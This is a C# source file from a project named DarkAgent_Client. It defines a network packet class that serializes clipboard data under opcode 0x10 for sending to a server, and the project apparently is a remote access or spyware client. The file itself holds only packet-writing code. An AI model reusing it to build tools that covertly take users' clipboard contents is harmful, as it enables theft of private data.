using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Send
{
    class S_GetClipboard : SendBasePacket
    {
        string data;
        public S_GetClipboard(ClientConnect client, string data)
            : base(client)
        {
            this.data = data;
        }

        protected internal override void Write()
        {
            WriteByte(0x10);
            WriteString(data);
        }
    }
}
